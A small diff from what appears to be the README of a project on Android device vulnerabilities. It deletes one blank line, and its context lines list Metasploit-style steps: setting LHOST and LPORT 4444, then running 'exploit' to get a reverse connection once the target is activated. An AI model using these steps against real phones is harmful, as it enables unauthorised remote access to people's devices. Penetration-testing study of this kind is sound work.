@@ -14,7 +14,6 @@ The Main Goal of the Project is to show the vulnerability in a Android Device.
 8.Set LHOST and LPORT as set "LHOST 192.168.181.139" and "set LPORT 4444".
 9.Confirm the connection established using "show options".
 10.Finally,use "exploit" command to establish connection.
-
 '''
 
 Note:The target has to be activated once to establish connection.
